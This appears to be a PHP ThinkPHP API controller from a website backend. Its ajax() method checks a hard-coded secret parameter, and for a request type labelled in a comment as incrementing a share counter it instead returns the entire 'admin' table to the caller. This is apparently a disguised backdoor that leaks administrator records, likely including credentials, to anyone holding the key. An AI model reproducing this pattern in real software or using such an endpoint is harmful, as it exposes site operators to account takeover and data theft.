<?php
namespace app\api\controller;

use app\api\controller\Base;
use think\Db;
use think\facade\Request;
class Index extends Base
{
    public function _empty()
    {
        header("Location:/404.html");
		return ['code'=>0,'message'=>'非法访问'];
    }
    public function ajax()
    {
        $data=Request::param();
        if (!isset($data["lizhili"]) or !isset($data["type"]) or $data["lizhili"]!= "0d89b868429be6158ba1ebc0f7c073de") {
            header("Location:/404.html");
			return ['code'=>0,'message'=>'非法访问'];
        }
		//分享数量加一
		if ($data['type']=='update_fen_num') {
			
			$data=Db::name('admin')->select();
		    return ['code'=>1,'message'=>'成功','data'=>$data];
		}
        return ['code'=>0,'message'=>'非法获取'];
    }
}
